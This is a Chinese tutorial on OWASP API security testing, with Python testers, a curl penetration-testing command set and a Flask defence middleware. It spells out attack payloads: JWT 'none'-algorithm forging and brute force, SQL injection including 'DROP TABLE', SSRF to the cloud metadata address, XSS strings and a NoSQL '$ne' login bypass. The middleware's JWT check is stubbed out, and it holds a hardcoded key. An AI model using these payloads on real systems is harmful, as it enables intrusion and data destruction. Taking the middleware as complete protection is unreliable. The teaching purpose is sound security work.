---
id: "34-001"
title: "OWASP API安全测试 (OWASP API Security Testing)"
category: "API安全"
category_en: "API Security"
difficulty: "★★★★"
tools: "Burp Suite, Postman, OWASP ZAP, k6, curl"
last_updated: "2026-05"
tags: [api-security, owasp, penetration-testing, rest-api, graphql]
subdomain: api-security
nist_csf: [PR.AC-04, PR.AC-07, DE.CM-08, ID.RA-01]
mitre_attack: [T1071, T1190, T1550, T1593]
---

# OWASP API安全测试 (OWASP API Security Testing)

## 概述

API 是现代应用架构的基石，也是最常见的攻击目标之一。OWASP API Security Top 10 列出了 API 最常见的 10 类安全风险。本技能覆盖 API 安全测试方法论、认证绕过、注入攻击、批量分配（Mass Assignment）和速率限制测试等。

## 核心技能

### 1. OWASP API Security Top 10

```python
"""OWASP API Security Top 10 检测"""

class APISecurityTest:
    """API 安全检测"""
    
    API_SECURITY_TOP_10 = {
        "API1:2023": "Broken Object Level Authorization (BOLA)",
        "API2:2023": "Broken Authentication",
        "API3:2023": "Broken Object Property Level Authorization",
        "API4:2023": "Unrestricted Resource Consumption",
        "API5:2023": "Broken Function Level Authorization",
        "API6:2023": "Unrestricted Access to Sensitive Business Flows",
        "API7:2023": "Server Side Request Forgery (SSRF)",
        "API8:2023": "Security Misconfiguration",
        "API9:2023": "Improper Inventory Management",
        "API10:2023": "Unsafe Consumption of APIs"
    }
    
    def __init__(self, base_url, api_key=None):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.findings = []
    
    def test_bola(self, session):
        """测试 BOLA — 对象级授权缺陷"""
        results = []
        
        # 测试1: 修改用户ID访问其他用户数据
        endpoints = [
            ("GET", "/api/v1/users/1001"),
            ("GET", "/api/v1/users/1002"),
            ("GET", "/api/v1/users/1003"),
        ]
        
        for method, path in endpoints:
            response = session.request(method, f"{self.base_url}{path}")
            if response.status_code == 200:
                results.append({
                    "endpoint": path,
                    "issue": "BOLA — 可访问其他用户的数据",
                    "severity": "CRITICAL"
                })
        
        return results
    
    def test_mass_assignment(self, session):
        """测试批量分配 (Mass Assignment)"""
        # 尝试添加额外字段
        payload = {
            "username": "testuser",
            "password": "Test123!",
            "role": "admin",  # 额外字段
            "is_admin": True,  # 额外字段
            "balance": 999999  # 额外字段
        }
        
        response = session.post(
            f"{self.base_url}/api/v1/users",
            json=payload
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("role") == "admin" or data.get("is_admin"):
                return {
                    "issue": "Mass Assignment — 可通过请求注入管理员角色",
                    "severity": "CRITICAL",
                    "details": "未对可写字段做白名单限制"
                }
        return None
    
    def test_rate_limiting(self, session):
        """测试速率限制"""
        import time
        
        responses = []
        for i in range(100):
            response = session.get(f"{self.base_url}/api/v1/products")
            responses.append(response.status_code)
            if i % 10 == 9:
                time.sleep(0.1)
        
        # 检查是否有 429 Too Many Requests
        has_rate_limit = any(code == 429 for code in responses)
        
        if not has_rate_limit:
            return {
                "issue": "Missing Rate Limiting",
                "severity": "MEDIUM",
                "details": "100次请求未触发速率限制",
                "status_codes": dict((code, responses.count(code)) for code in set(responses))
            }
        return None
    
    def generate_report(self):
        """生成测试报告"""
        return {
            "target": self.base_url,
            "total_findings": len(self.findings),
            "findings": self.findings,
            "coverage": list(self.API_SECURITY_TOP_10.keys())
        }

# 使用示例
tester = APISecurityTest("https://api.example.com")
print(f"API Security tests loaded for {tester.base_url}")
print(f"Coverage: {len(tester.API_SECURITY_TOP_10)} categories")
```

### 2. REST API 渗透测试

```bash
# REST API 渗透测试命令集合

# 1. 信息收集
# 发现 API 端点
curl -s "https://api.example.com/" -H "Accept: application/json"
curl -s "https://api.example.com/swagger/v1/swagger.json"
curl -s "https://api.example.com/api/v1/"
curl -s "https://api.example.com/.well-known/openid-configuration"

# 枚举 API 版本
for version in v1 v2 v3 v4; do
    echo "=== $version ==="
    curl -s -o /dev/null -w "%{http_code}" "https://api.example.com/api/$version/users"
    echo ""
done

# 2. 认证绕过测试
# Token 为空
curl -s "https://api.example.com/api/v1/admin/users" -H "Authorization: Bearer "

# Token 格式错误
curl -s "https://api.example.com/api/v1/admin/users" -H "Authorization: Bearer invalid"

# 删除认证头
curl -s "https://api.example.com/api/v1/admin/users"

# JWT 攻击
# 修改算法为 none
jwt_payload='{"alg":"none","typ":"JWT"}'
jwt_claims='{"sub":"admin","iat":1516239022,"exp":9999999999}'
# 使用空签名
echo "$(echo -n $jwt_payload | base64).$(echo -n $jwt_claims | base64)."

# 弱密钥爆破 (使用 jwt_tool)
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -C -d wordlist.txt

# 3. 参数篡改
# 批量枚举 ID
for id in 1 2 3 4 5 10 100 1000; do
    curl -s "https://api.example.com/api/v1/users/$id" | jq '{id, username, email, role}'
done

# HTTP 方法篡改
curl -X PUT "https://api.example.com/api/v1/users/1" -H "Content-Type: application/json" -d '{"role":"admin"}'
curl -X DELETE "https://api.example.com/api/v1/users/1"
curl -X PATCH "https://api.example.com/api/v1/users/1" -H "Content-Type: application/json" -d '{"role":"admin"}'

# 4. SQL 注入测试
curl -s "https://api.example.com/api/v1/users?name=admin' OR '1'='1"
curl -s "https://api.example.com/api/v1/users?id=1 UNION SELECT * FROM users"
curl -s "https://api.example.com/api/v1/users?order=id; DROP TABLE users--"

# 5. SSRF 测试
curl -s "https://api.example.com/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://api.example.com/api/v1/proxy?url=http://localhost:9200/"
curl -s "https://api.example.com/api/v1/proxy?url=http://127.0.0.1:8080/"
```

### 3. 自动化 API 测试

```python
"""自动化 API 安全测试"""

import requests
import json

class APIAutomationTester:
    """API 自动化安全测试"""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = []
    
    def test_authentication(self):
        """测试认证机制"""
        # 无认证访问
        r = self.session.get(f"{self.base_url}/api/v1/admin/users")
        if r.status_code != 401 and r.status_code != 403:
            self.results.append({
                "test": "No Auth Access",
                "severity": "CRITICAL",
                "finding": "Admin endpoint accessible without authentication"
            })
        
        # 弱密码测试
        weak_passwords = ["admin", "password", "123456", "admin123"]
        for pw in weak_passwords:
            r = self.session.post(
                f"{self.base_url}/api/v1/auth/login",
                json={"username": "admin", "password": pw}
            )
            if r.status_code == 200:
                self.results.append({
                    "test": "Weak Password",
                    "severity": "HIGH",
                    "finding": f"Admin can login with password: {pw}"
                })
                break
    
    def test_authorization(self):
        """测试授权缺陷"""
        # 水平越权: 访问其他用户的资源
        r = self.session.get(f"{self.base_url}/api/v1/orders/1001")
        if "user_id" in r.text:
            # 尝试访问不同用户的订单
            r2 = self.session.get(f"{self.base_url}/api/v1/orders/1002")
            if r2.status_code == 200:
                self.results.append({
                    "test": "Horizontal Privilege Escalation",
                    "severity": "CRITICAL",
                    "finding": "Able to access other users' orders by changing ID"
                })
        
        # 垂直越权: 访问管理员功能
        r = self.session.get(f"{self.base_url}/api/v1/admin/health")
        if r.status_code == 200:
            self.results.append({
                "test": "Vertical Privilege Escalation",
                "severity": "HIGH",
                "finding": "Admin health endpoint accessible by regular user"
            })
    
    def test_input_validation(self):
        """测试输入验证"""
        # XSS
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)"
        ]
        for payload in payloads:
            r = self.session.get(
                f"{self.base_url}/api/v1/search?q={payload}"
            )
            if payload in r.text:
                self.results.append({
                    "test": "XSS",
                    "severity": "HIGH",
                    "finding": f"XSS payload reflected: {payload}"
                })
                break
        
        # NoSQL Injection (MongoDB)
        r = self.session.post(
            f"{self.base_url}/api/v1/auth/login",
            json={"username": {"$ne": None}, "password": {"$ne": None}}
        )
        if r.status_code == 200:
            self.results.append({
                "test": "NoSQL Injection",
                "severity": "CRITICAL",
                "finding": "NoSQL injection possible via $ne operator"
            })
    
    def run_full_scan(self):
        """执行完整扫描"""
        print(f"[*] Starting API security scan: {self.base_url}")
        self.test_authentication()
        self.test_authorization()
        self.test_input_validation()
        return {
            "target": self.base_url,
            "total": len(self.results),
            "findings": [r for r in self.results if r["severity"] in ["CRITICAL", "HIGH"]],
            "info": [r for r in self.results if r["severity"] not in ["CRITICAL", "HIGH"]]
        }

# 使用示例
tester = APIAutomationTester("https://api.example.com")
report = tester.run_full_scan()
print(json.dumps(report, indent=2))
```

### 4. API 安全防护

```python
"""API 安全防护中间件"""

from functools import wraps
from flask import request, jsonify, abort
import time

class APISecurityMiddleware:
    """API 安全防护中间件"""
    
    def __init__(self, app=None):
        self.app = app
        self.rate_limit_store = {}
        self.allowed_origins = ["https://app.company.com"]
        self.api_key_store = {"key-abc123": "user1"}
    
    def rate_limit(self, max_requests=100, window_seconds=60):
        """速率限制装饰器"""
        def decorator(f):
            @wraps(f)
            def wrapper(*args, **kwargs):
                client_ip = request.remote_addr
                now = time.time()
                
                # 初始化或清理过期记录
                if client_ip not in self.rate_limit_store:
                    self.rate_limit_store[client_ip] = []
                
                self.rate_limit_store[client_ip] = [
                    t for t in self.rate_limit_store[client_ip]
                    if now - t < window_seconds
                ]
                
                if len(self.rate_limit_store[client_ip]) >= max_requests:
                    return jsonify({
                        "error": "rate_limit_exceeded",
                        "message": "Too many requests"
                    }), 429
                
                self.rate_limit_store[client_ip].append(now)
                return f(*args, **kwargs)
            return wrapper
        return decorator
    
    def require_auth(self, f):
        """认证验证装饰器"""
        @wraps(f)
        def wrapper(*args, **kwargs):
            api_key = request.headers.get("X-API-Key")
            auth_header = request.headers.get("Authorization", "")
            
            # API Key 验证
            if api_key:
                if api_key in self.api_key_store:
                    request.user = self.api_key_store[api_key]
                    return f(*args, **kwargs)
            
            # Bearer Token 验证
            if auth_header.startswith("Bearer "):
                token = auth_header[7:]
                # 验证 JWT
                # decoded = verify_jwt(token)
                # if decoded:
                #     request.user = decoded["sub"]
                #     return f(*args, **kwargs)
                pass
            
            return jsonify({"error": "unauthorized"}), 401
        return wrapper
    
    def validate_input(self, allowed_fields):
        """输入验证装饰器"""
        def decorator(f):
            @wraps(f)
            def wrapper(*args, **kwargs):
                if request.is_json:
                    data = request.get_json()
                    # 检查额外字段（防 Mass Assignment）
                    for field in data:
                        if field not in allowed_fields:
                            return jsonify({
                                "error": "invalid_field",
                                "message": f"Unexpected field: {field}"
                            }), 400
                return f(*args, **kwargs)
            return wrapper
        return decorator

# 使用示例
print("API Security Middleware loaded")
print("Protections: Rate Limiting, Auth, Input Validation")
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Burp Suite | Web/API 渗透测试 | https://portswigger.net/burp |
| OWASP ZAP | 开源 API 扫描 | https://www.zaproxy.org/ |
| Postman | API 测试与调试 | https://www.postman.com/ |
| k6 | API 负载测试 | https://k6.io/ |
| jwt_tool | JWT 安全测试 | https://github.com/ticarpi/jwt_tool |

## 参考资源

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [REST API Security Testing Guide](https://brightsec.com/blog/api-security-testing/)
- [JWT Attacks Guide](https://portswigger.net/web-security/jwt)
- [NIST SP 800-204 — API Security](https://csrc.nist.gov/publications/detail/sp/800-204/final)
- [API Security Best Practices — Google](https://cloud.google.com/apigee/docs/api-security)
